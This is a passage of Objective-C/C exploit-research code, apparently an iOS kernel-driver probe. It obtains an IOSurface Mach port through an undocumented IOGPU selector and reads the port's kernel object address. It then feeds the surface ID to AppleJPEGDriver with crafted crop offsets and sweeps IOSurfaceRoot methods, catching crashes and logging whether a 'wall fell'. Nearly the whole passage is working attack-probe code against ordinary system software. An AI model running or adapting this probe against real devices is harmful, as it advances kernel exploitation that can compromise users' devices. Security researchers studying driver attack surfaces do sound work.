    sigaction(SIGSEGV, &p018_old_segv, NULL);
    sigaction(SIGBUS, &p018_old_bus, NULL);
    sigaction(SIGILL, &p018_old_ill, NULL);
}

static int p018_enter(const char *msg) {
    jlog("%s", msg);
    if (j_fd >= 0) fcntl(j_fd, F_FULLFSYNC);
    p018_sig = 0;
    return sigsetjmp(p018_jmp, 1);
}

static const char *p018_port_verdict(mach_port_type_t t) {
    if (t & MACH_PORT_TYPE_DEAD_NAME) return "DEAD";
    if (t & MACH_PORT_TYPE_RECEIVE) return "RECEIVE";
    if (t & MACH_PORT_TYPE_SEND_ONCE) return "SEND_ONCE";
    if (t & MACH_PORT_TYPE_SEND) return "SEND RIGHT";
    return "UNKNOWN";
}

static kern_return_t p018_jpeg_dest(IOConnectCallMethod_t call, io_connect_t jconn,
                                    uint32_t srcID, uint32_t dest, uint32_t w, uint32_t h,
                                    uint32_t crop_flag, uint32_t offx, uint32_t offy,
                                    const char *tag) {
    uint8_t *big = calloc(1, 0x2000);
    uint8_t *outb = calloc(1, 0x2000);
    kern_return_t kr = (kern_return_t)0xe00002bc;
    if (!big || !outb) {
        jlog("p018 STOP calloc jpeg");
        free(big); free(outb);
        return kr;
    }
    uint32_t dw = w ? w : 8;
    uint32_t dh = h ? h : 8;
    j_pack(big, srcID, dest, dw, dh);
    if (crop_flag) {
        *(uint32_t *)(big + 0x428) = offx;
        *(uint32_t *)(big + 0x42c) = offy;
        *(uint32_t *)(big + 0x4b4) = crop_flag;
    }
    if (p018_enter(tag) == 0) {
        size_t outsz = 0x1000;
        kr = call(jconn, 5, NULL, 0, big, 0x1000, NULL, NULL, outb, &outsz);
        jlog("p018 [jpeg] %s -> 0x%08x (%s) outsz=%zu", tag, (unsigned)kr, jkr(kr), outsz);
    } else {
        jlog("p018 [jpeg] CRASH signal=%d during %s — continuing", (int)p018_sig, tag);
        kr = (kern_return_t)0xdead;
    }
    if (j_fd >= 0) fcntl(j_fd, F_FULLFSYNC);
    free(big); free(outb);
    return kr;
}

+ (NSString *)runP018SoutMachPort {
    j_buf = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p018_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    j_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);
    p018_protect_on();

    jlog("=== p018 v3: correct-ID lookup + immediate dest + registration test ===");
    jlog("[*] GUARDED port. NO mach_msg. NO port right changes.");
    jlog("[*] LookupFromMachPort -> GetID -> IOSurfaceLookup(id) -> dest retries.");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *libkern = dlopen("/usr/lib/system/libsystem_kernel.dylib", RTLD_LAZY);
    void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
    if (!iogpu || !iokit || !iosH) {
        jlog("p018 STOP dlopen");
        p018_protect_off();
        return j_finish();
    }

    p016_gettype_t getType = dlsym(iogpu, "IOGPUResourceGetResourceType");
    p016_getconn_t devConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    IOSurfaceLookup_t lookupId = dlsym(iosH, "IOSurfaceLookup");
    IOSurfaceLookupFromMachPort_t lookupPort = dlsym(iosH, "IOSurfaceLookupFromMachPort");
    typedef IOSurfaceRef (*lookupXpc_t)(void *);
    typedef void *(*xpcSend_t)(mach_port_t);
    typedef void (*xpcRel_t)(void *);
    lookupXpc_t lookupXpc = dlsym(iosH, "IOSurfaceLookupFromXPCObject");
    xpcSend_t xpcSend = libxpc ? dlsym(libxpc, "xpc_mach_send_create") : NULL;
    if (!xpcSend) xpcSend = dlsym(RTLD_DEFAULT, "xpc_mach_send_create");
    xpcRel_t xpcRel = libxpc ? dlsym(libxpc, "xpc_release") : NULL;
    IOSurfaceGetID_t getID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceLock_t iosLock = dlsym(iosH, "IOSurfaceLock");
    IOSurfaceUnlock_t iosUnlock = dlsym(iosH, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t iosBase = dlsym(iosH, "IOSurfaceGetBaseAddress");
    IOServiceMatching_t matching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t open = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t close = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t release = dlsym(iokit, "IOObjectRelease");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    mach_port_kobject_t kobj = libkern ? dlsym(libkern, "mach_port_kobject") : NULL;
    if (!kobj) kobj = dlsym(RTLD_DEFAULT, "mach_port_kobject");

    if (!getType || !call || !iosCreate || !getID || !matching || !getsvc || !open || !mp || !lookupPort) {
        jlog("p018 STOP dlsym LookupFromMachPort=%p", lookupPort);
        p018_protect_off();
        return j_finish();
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { jlog("p018 STOP no Metal"); p018_protect_off(); return j_finish(); }
    (void)[dev newCommandQueue];
    id mtlDev = p016_unwrap(dev);
    void *devRef = p016_ivar(mtlDev, "_deviceRef");
    uint32_t dconn = (devConn && devRef) ? devConn(devRef) : 0;
    jlog("p018 [0] metal=%s dconn=0x%x", [[dev name] UTF8String], dconn);

    const vm_size_t Ls = 0x4000;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        jlog("p018 STOP vm_allocate"); p018_protect_off(); return j_finish();
    }
    memset((void *)pg, 0x41, (size_t)Ls);
    id buf = [dev newBufferWithBytesNoCopy:(void *)pg length:Ls
                                   options:MTLResourceStorageModeShared
                               deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
    void *ref = buf ? p016_ref(buf) : NULL;
    uint32_t typ = (ref && getType) ? getType(ref) : 0;
    if (!buf || !ref || typ != 0x80) {
        jlog("p018 STOP no type 0x80 typ=0x%x", typ);
        vm_deallocate(mach_task_self(), pg, Ls); p018_protect_off(); return j_finish();
    }
    uint32_t rid = *(uint32_t *)((uint8_t *)ref + 0x30);
    void *devw = *(void **)((uint8_t *)ref + 0x10);
    uint32_t rconn = 0;
    if (devw) rconn = *(uint32_t *)((uint8_t *)((uintptr_t)devw & 0x7FFFFFFFFFULL) + 0x14);
    uint32_t conn = dconn ? dconn : rconn;
    jlog("p018 [0] type=0x80 id=%u conn=0x%x", rid, conn);
    if (!conn || !rid) {
        jlog("p018 STOP conn/id");
        vm_deallocate(mach_task_self(), pg, Ls); p018_protect_off(); return j_finish();
    }

    uint64_t in36[3] = { rid, 0, 0x1000 };
    uint64_t sout = 0;
    uint32_t nout = 1;
    jlog("p018 [calib] about to sel36 {id=%u,0,0x1000}", rid);
    fcntl(j_fd, F_FULLFSYNC);
    kern_return_t kr = call(conn, 36, in36, 3, NULL, 0, &sout, &nout, NULL, NULL);
    jlog("p018 [calib] sel36 kr=0x%08x (%s) sout=0x%llx nout=%u",
         (unsigned)kr, jkr(kr), (unsigned long long)sout, nout);
    fcntl(j_fd, F_FULLFSYNC);
    if (kr != 0) {
        jlog("p018 verdict: LOOKUP FAILED (sel36 not SUCCESS)");
        vm_deallocate(mach_task_self(), pg, Ls); p018_protect_off(); return j_finish();
    }
    mach_port_name_t pname = (mach_port_name_t)(uint32_t)sout;

    /* allowed inspect only */
    mach_port_type_t ptype = 0;
    if (p018_enter("p018 [port] about to mach_port_type") == 0) {
        kern_return_t tkr = mach_port_type(mach_task_self(), pname, &ptype);
        jlog("p018 [port] type=0x%x kr=0x%x (%s)", ptype, tkr,
             tkr == KERN_SUCCESS ? p018_port_verdict(ptype) : "?");
    } else jlog("p018 [port] CRASH on mach_port_type sig=%d", (int)p018_sig);
    mach_port_urefs_t refs = 0;
    if (p018_enter("p018 [port] about to mach_port_get_refs") == 0) {
        kern_return_t rkr = mach_port_get_refs(mach_task_self(), pname, MACH_PORT_RIGHT_SEND, &refs);
        jlog("p018 [port] refs=0x%x kr=0x%x", refs, rkr);
    } else jlog("p018 [port] CRASH on get_refs sig=%d", (int)p018_sig);
    if (kobj) {
        uint32_t ktype = 0; uint64_t kaddr = 0;
        if (p018_enter("p018 [port] about to mach_port_kobject") == 0) {
            kern_return_t kkr = kobj(mach_task_self(), pname, &ktype, &kaddr);
            jlog("p018 [port] kobject type=0x%x addr=0x%llx kr=0x%x", ktype, (unsigned long long)kaddr, kkr);
        } else jlog("p018 [port] CRASH on kobject sig=%d", (int)p018_sig);
    }

    /* STEP 2 */
    IOSurfaceRef surf = NULL;
    if (p018_enter("p018 [2] about to LookupFromMachPort") == 0) {
        surf = lookupPort(pname);
        jlog("p018 [2] LookupFromMachPort(sout) = %p", surf);
    } else {
        jlog("p018 [2] CRASH sig=%d LookupFromMachPort", (int)p018_sig);
    }
    uint32_t surfaceID = 0;
    if (surf) {
        if (p018_enter("p018 [2] about to IOSurfaceGetID") == 0) {
            surfaceID = getID(surf);
            jlog("p018 [2] IOSurfaceGetID = 0x%x", surfaceID);
        } else {
            jlog("p018 [2] CRASH sig=%d GetID — dest will still try sout", (int)p018_sig);
        }
    }

    /* STEP 3 — Lookup with CORRECT id */
    IOSurfaceRef surf2 = NULL;
    if (lookupId && surfaceID) {
        if (p018_enter("p018 [3] about to IOSurfaceLookup(surfaceID)") == 0) {
            surf2 = lookupId(surfaceID);
            jlog("p018 [3] IOSurfaceLookup(surfaceID) = %p", surf2);
        } else jlog("p018 [3] CRASH sig=%d IOSurfaceLookup(id)", (int)p018_sig);
    } else {
        jlog("p018 [3] IOSurfaceLookup(surfaceID) skipped (id=0x%x lookupId=%p)", surfaceID, lookupId);
    }

    /* STEP 4 — JPEG immediately */
    IOSurfaceRef src = NULL; uint32_t srcID = 0;
    if (p018_enter("p018 [4] about to create src 8x8 BGRA") == 0) {
        src = j_surf(iosCreate, 8, 8, 'BGRA', 4);
        if (src) srcID = getID(src);
        jlog("p018 [4] src id=0x%x", srcID);
        if (src && iosLock && iosBase && iosUnlock && iosLock(src, 0, NULL) == 0) {
            void *b = iosBase(src);
            if (b) memset(b, 0xFF, 8 * 8 * 4);
            iosUnlock(src, 0, NULL);
        }
    } else jlog("p018 [4] CRASH sig=%d creating src", (int)p018_sig);

    io_service_t jsvc = MACH_PORT_NULL; io_connect_t jconn = MACH_PORT_NULL;
    kern_return_t jok = 0xe00002c2;
    if (p018_enter("p018 [4] about to open AppleJPEGDriver") == 0) {
        jsvc = getsvc(*mp, matching("AppleJPEGDriver"));
        if (jsvc) jok = open(jsvc, mach_task_self(), 0, &jconn);
        jlog("p018 [4] jpeg open conn=0x%x kr=0x%08x (%s)", jconn, (unsigned)jok, jkr(jok));
    } else jlog("p018 [4] CRASH sig=%d JPEG open", (int)p018_sig);

    int fell = 0; int fell_n = 0;
    kern_return_t last = 0xe00002cc;
#define P018_DEST(n, dest, tagstr) do { \
        if (jok==0 && jconn && srcID && (dest)) { \
            last = p018_jpeg_dest(call, jconn, srcID, (dest), 8, 8, 0, 0, 0, (tagstr)); \
            jlog("%s -> 0x%08x (%s)", (tagstr), (unsigned)last, jkr(last)); \
            if (last == 0 && !fell) { fell = 1; fell_n = (n); } \
        } else { jlog("%s skipped", (tagstr)); } \
        fcntl(j_fd, F_FULLFSYNC); \
    } while (0)

    uint32_t destID = surfaceID ? surfaceID : (uint32_t)sout;
    P018_DEST(1, destID, "p018 [4] jpeg dest=surfaceID attempt1");

    /* STEP 5 retry */
    P018_DEST(2, destID, "p018 [5] jpeg dest=surfaceID attempt2");

    /* STEP 6 lock then dest — BaseAddress WHILE LOCKED */
    kern_return_t lkr = 0xffffffff;
    void *base_before = NULL, *base_after = NULL;
    if (surf && iosBase) {
        if (p018_enter("p018 [6] about to GetBaseAddress BEFORE lock") == 0) {
            base_before = iosBase(surf);
            jlog("p018 [6] GetBaseAddress before lock = %p", base_before);
        } else jlog("p018 [6] CRASH sig=%d GetBaseAddress before lock", (int)p018_sig);
    }
    if (surf && iosLock) {
        if (p018_enter("p018 [6] about to IOSurfaceLock(surf,0)") == 0) {
            lkr = iosLock(surf, 0, NULL);
            jlog("p018 [6] IOSurfaceLock(surf) = 0x%x", lkr);
            if (lkr == 0) {
                if (iosBase && p018_enter("p018 [6] about to GetBaseAddress AFTER lock (still held)") == 0) {
                    base_after = iosBase(surf);
                    jlog("p018 [6] GetBaseAddress after lock = %p %s",
                         base_after, base_after ? "CPU-MAPPED" : "NULL still (kernel-only)");
                    if (base_after) {
                        volatile uint8_t peek = *(volatile uint8_t *)base_after;
                        jlog("p018 [6] mapped byte[0]=0x%02x (user-page peek)", peek);
                    }
                } else if (lkr == 0) {
                    jlog("p018 [6] CRASH sig=%d GetBaseAddress after lock", (int)p018_sig);
                }
                if (iosUnlock) iosUnlock(surf, 0, NULL);
            }
        } else jlog("p018 [6] CRASH sig=%d IOSurfaceLock — dest attempt3 still runs", (int)p018_sig);
    } else {
        jlog("p018 [6] IOSurfaceLock skipped");
    }
    P018_DEST(3, destID, "p018 [6] jpeg dest=surfaceID attempt3");

    /* STEP 7 XPC wrap of the port (no mach_msg) */
    IOSurfaceRef surf3 = NULL;
    if (lookupXpc && xpcSend) {
        if (p018_enter("p018 [7] about to xpc_mach_send_create + LookupFromXPCObject") == 0) {
            void *xo = xpcSend(pname);
            surf3 = xo ? lookupXpc(xo) : NULL;
            if (xo && xpcRel) xpcRel(xo);
            jlog("p018 [7] LookupFromXPCObject(sout) = %p", surf3);
        } else jlog("p018 [7] CRASH sig=%d XPC lookup", (int)p018_sig);
    } else {
        jlog("p018 [7] LookupFromXPCObject skipped (xpcSend=%p lookupXpc=%p)", xpcSend, lookupXpc);
    }
    P018_DEST(4, destID, "p018 [7] jpeg dest=surfaceID attempt4");

    /* STEP 8 LookupFromMachPort again */
    IOSurfaceRef surf4 = NULL;
    if (p018_enter("p018 [8] about to LookupFromMachPort again") == 0) {
        surf4 = lookupPort(pname);
        jlog("p018 [8] LookupFromMachPort again = %p%s", surf4,
             (surf4 && surf4 == surf) ? " (same ref)" : "");
    } else jlog("p018 [8] CRASH sig=%d second LookupFromMachPort", (int)p018_sig);
    P018_DEST(5, destID, "p018 [8] jpeg dest=surfaceID attempt5");

    /* IOSurfaceRootUserClient: open + method enumerate (0 scalars / 1 scalar=id).
       Sync IOConnect from our thread. No mach_msg on sout. */
    io_service_t rsvc = MACH_PORT_NULL;
    io_connect_t rootConn = MACH_PORT_NULL;
    kern_return_t ropen = 0xe00002c2;
    if (p018_enter("p018 [root] about to IOServiceOpen(IOSurfaceRoot)") == 0) {
        rsvc = getsvc(*mp, matching("IOSurfaceRoot"));
        if (rsvc) ropen = open(rsvc, mach_task_self(), 0, &rootConn);
        jlog("p018 [root] IOSurfaceRoot open = 0x%08x (%s) conn=0x%x",
             (unsigned)ropen, jkr(ropen), rootConn);
    } else jlog("p018 [root] CRASH sig=%d opening Root", (int)p018_sig);
    if (ropen == 0 && rootConn && call) {
        jlog("p018 [root] method sweep sel 0-31 scIn=0 and scIn=1(id=0x%x)", destID);
        for (uint32_t sel = 0; sel < 32; sel++) {
            uint64_t so = 0; uint32_t nso = 1;
            kern_return_t a = 0xe00002c2, b = 0xe00002c2;
            char tag[80];
            snprintf(tag, sizeof(tag), "p018 [root] about to sel=%u scIn=0", sel);
            if (p018_enter(tag) == 0) {
                uint32_t z = 0;
                a = call(rootConn, sel, NULL, 0, NULL, 0, NULL, &z, NULL, NULL);
            } else {
                jlog("p018 [root] CRASH sig=%d sel=%u scIn=0 — stopping sweep", (int)p018_sig, sel);
                break;
            }
            snprintf(tag, sizeof(tag), "p018 [root] about to sel=%u scIn=1 id=0x%x", sel, destID);
            if (p018_enter(tag) == 0) {
                uint64_t sin = destID;
                nso = 1; so = 0;
                b = call(rootConn, sel, &sin, 1, NULL, 0, &so, &nso, NULL, NULL);
            } else {
                jlog("p018 [root] CRASH sig=%d sel=%u scIn=1 — stopping sweep", (int)p018_sig, sel);
                break;
            }
            if (a != 0xe00002c2 || b != 0xe00002c2 || so != 0)
                jlog("p018 [root] sel=%u sc0=0x%08x (%s) sc1=0x%08x (%s) sout=0x%llx nout=%u",
                     sel, (unsigned)a, jkr(a), (unsigned)b, jkr(b),
                     (unsigned long long)so, nso);
        }
        jlog("p018 [root] sweep done (silent 0x2c2 omitted)");
    }

    if (fell) {
        jlog("p018 [4] verdict: WALL FELL");
        jlog("p018 verdict: WALL FELL on attempt %d", fell_n);
        uint32_t cdest = destID;
        jlog("p018 [crop] ONE crop flag=1 offsetX=0 then STOP");
        kern_return_t ckr = p018_jpeg_dest(call, jconn, srcID, cdest, 8, 8, 1, 0, 0,
            "p018 [crop] flag=1 offsetX=0");
        jlog("p018 [5] crop flag=1 offsetX=0 -> 0x%08x (%s)", (unsigned)ckr, jkr(ckr));
    } else if ((unsigned)last == 0xe00002d6) {
        jlog("p018 [4] verdict: TIMEOUT");
        jlog("p018 verdict: WALL STANDS all attempts (last TIMEOUT)");
    } else {
        jlog("p018 [4] verdict: WALL STANDS");
        jlog("p018 verdict: WALL STANDS all attempts");
    }

    if (rootConn && close) close(rootConn);
    if (rsvc && release) release(rsvc);
    if (jconn && close) close(jconn);
    if (jsvc && release) release(jsvc);
    if (src) { if (p018_enter("p018 [cleanup] CFRelease src")==0) CFRelease(src); }
    if (surf2 && surf2 != surf) { if (p018_enter("p018 [cleanup] CFRelease surf2")==0) CFRelease(surf2); }
    if (surf3 && surf3 != surf && surf3 != surf2) {
        if (p018_enter("p018 [cleanup] CFRelease surf3")==0) CFRelease(surf3);
    }
    if (surf4 && surf4 != surf && surf4 != surf2 && surf4 != surf3) {
        if (p018_enter("p018 [cleanup] CFRelease surf4")==0) CFRelease(surf4);
    }
    if (surf) { if (p018_enter("p018 [cleanup] CFRelease surf")==0) CFRelease(surf); }
    vm_deallocate(mach_task_self(), pg, Ls);
    p018_protect_off();
    return j_finish();
}

@end
